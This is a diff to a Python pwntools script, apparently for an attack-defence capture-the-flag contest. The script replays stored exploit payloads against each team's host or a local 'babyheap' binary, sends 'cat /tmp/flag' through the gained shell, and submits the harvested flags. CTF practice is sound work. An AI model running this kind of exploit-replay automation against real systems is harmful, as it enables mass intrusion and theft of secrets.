@@ -8,6 +8,9 @@ ERROR_VALUE = 0x94ac411122323232332
 context(log_level='DEBUG')
 SLEEP_TIME = 0.1
 
+from flag_util import teams
+from flag_util import submit_flag
+
 def get_data_value_by_type(value,value_type,length):
     if value_type == 'DEC':
         return str(value)
@@ -205,23 +208,41 @@ def send_one_file(file_name,ip,port):
         print 'remote verify ' + ip + ' failed: ' + file_name
 
 
+def usage():
+    for i in range(0,len(sys.argv)):
+        print "sys.argv["+str(i)+"]: " + sys.argv[i]
+    print "usage: 1. " +sys.argv[0] + " one_file file_name "
+    print "       2. " +sys.argv[0] + " local workspace"
+    exit(-1)
+
+
+
 if __name__ == "__main__":
-    if len(sys.argv)!=1:
+    ip_list = teams
+    if len(sys.argv) < 2:
+        usage()
+    if sys.argv[1] == 'one_file':
+        if len(sys.argv) != 2:
+            usage()
+        if not os.path.exists(sys.argv[2]):
+            print "File not exist: " + sys.argv[2]
+            usage()
         for ip in ip_list:
             try:
-                send_one_file(sys.argv[1],ip,port)
+                send_one_file(sys.argv[2],ip,port)
             except Exception as e:
                 print e.message
-        exit(0)
+    elif sys.argv[1] != "local":
+        usage()
     LOG_FORMAT = "%(asctime)s - %(levelname)s - %(message)s"
     logging.basicConfig(stream=sys.stdout, level=logging.DEBUG, format=LOG_FORMAT)
-    workspace = '/root/'
-    scan_dir = workspace + 'local_verify_success/'
-    verify_success_dir = workspace + 'remote_verify_success/'
-    verify_failed_dir = workspace + 'remote_verify_failed/'
+    workspace =  sys.argv[2]
+    scan_dir = workspace + '/local_verify_success/'
+    verify_success_dir = workspace + '/remote_verify_success/'
+    verify_failed_dir = workspace + '/remote_verify_failed/'
     if not os.path.exists(scan_dir):
-        logging.info( 'create scan dir: ' + scan_dir)
-        os.mkdir(scan_dir)
+        print "local workspace must start analysis server first"
+        usage()
     if not os.path.exists(verify_success_dir):
         logging.info( 'create remote verify success dir: ' + scan_dir)
         os.mkdir(verify_success_dir)
@@ -232,6 +253,7 @@ if __name__ == "__main__":
     while True:
         logging.debug( 'scan dir......................')
         for file_name in os.listdir(scan_dir):
+            success_flag = False
             if file_name.find('.')!=-1:
                 continue
             for ip in ip_list:
@@ -241,8 +263,8 @@ if __name__ == "__main__":
                     heap_base = 0
                     elf_base = 0
                     stack_base = 0
-                    con = remote(ip,port)
-
+                    #con = remote(ip,port)
+                    con = process('./babyheap',env={"LD_PRELOAD": './libc.so'})
                     pfile = open(os.path.join(scan_dir,file_name),'r')
                     json_datas = json.load(pfile)
                     pfile.close()
@@ -276,7 +298,7 @@ if __name__ == "__main__":
                                 results = re.findall('\{\{\{(.+?)\}\}\}', value)
                                 value_copy = value
                                 for result in results:
-                                    value_copy.replace(result,'A'*get_record_length(result))
+                                    value_copy = value_copy.replace("{{{"+result+"}}}", 'A' * get_record_length(result))
                                 total_length = len(value_copy)
                                 sleep(SLEEP_TIME)
                                 data = con.recv(total_length,timeout=10)
@@ -296,18 +318,25 @@ if __name__ == "__main__":
                                                                           get_record_length(result)) - get_record_offset(result)
                                     else:
                                         logging.error('ERROR! unknown record type')
-                    con.send('cat flag')
+                    con.sendline('cat /tmp/flag')
                     data = con.recv(timeout=2)
+                    print data
                     flag = re.findall('(hwctf\{\w+\})',data)
-
                     if len(flag)!=0:
-                        shutil.move(os.path.join(scan_dir,file_name),os.path.join(verify_success_dir,file_name))
-                        logging.info( "flag: "+flag)
-                        logging.info('remote verify ' + ip + ' succeed: ' + file_name)
-                    else:
-                        shutil.move(os.path.join(scan_dir,file_name),os.path.join(verify_failed_dir,file_name))
-                        logging.info( 'remote verify ' + ip + ' failed: ' + file_name)
+                        flag = flag[0]
+                        success_flag = True
+                        submit_flag(ip,flag)
                     con.close()
+
                 except Exception as e:
                     logging.info(e.message)
+                    con.close()
+
+            if success_flag:
+                shutil.move(os.path.join(scan_dir,file_name),os.path.join(verify_success_dir,file_name))
+                logging.info( "flag: "+flag)
+                logging.info('remote verify ' + ip + ' succeed: ' + file_name)
+            else:
+                shutil.move(os.path.join(scan_dir,file_name),os.path.join(verify_failed_dir,file_name))
+                logging.info( 'remote verify ' + ip + ' failed: ' + file_name)
         sleep(10)
